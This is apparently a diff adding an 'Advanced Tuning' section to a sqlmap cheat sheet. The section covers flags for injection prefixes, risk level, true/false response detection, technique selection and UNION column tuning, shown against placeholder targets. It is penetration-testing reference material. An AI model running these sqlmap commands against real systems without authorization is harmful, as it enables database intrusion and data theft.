@@ -43,3 +43,73 @@ sqlmap -u "http://www.target.com/vuln.php?id=1" --batch --parse-errors
 sqlmap -u "http://www.target.com/vuln.php?id=1" --proxy="http://127.0.0.1:8080"
 ```
 
+
+# Advanced Tuning
+
+```bash
+# Specifying a prefix or suffix
+sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
+
+# Specifying the level and risk
+sqlmap -u www.example.com/?id=1 -v 3 --level=5
+```
+
+```bash
+# HTTP Response Detection
+# --code
+Use when TRUE/FALSE is identified by HTTP status code
+Example: 200 = TRUE, 500 = FALSE
+sqlmap -u URL --code=200
+
+
+# --string
+Use when TRUE responses contain a specific word
+Example: "success" appears only when TRUE
+sqlmap -u URL --string="success"
+
+
+# --titles
+Use when TRUE/FALSE differs in <title> tag
+sqlmap -u URL --titles
+
+
+# --text-only
+Use when page has noisy HTML (scripts/styles/etc.)
+Compares only visible text
+sqlmap -u URL --text-only
+
+
+# SQL Injection Technique Control
+# --technique
+Force specific SQLi types
+B = Boolean-based
+E = Error-based
+U = UNION-based
+T = Time-based
+S = Stacked queries
+
+Example (fast + stable set):
+sqlmap -u URL --technique=BEU
+
+Skip slow/risky methods:
+(remove T = time-based)
+
+
+
+# UNION-Based Tuning
+# --union-cols
+Set number of columns manually (important for UNION success)
+sqlmap -u URL --union-cols=17
+
+
+# --union-char
+Change filler character used in UNION SELECT
+Default: NULL / random int  
+Use when output breaks
+sqlmap -u URL --union-char='a'
+
+
+# --union-from
+Add required FROM table (DB-specific like Oracle)
+sqlmap -u URL --union-from=users
+```
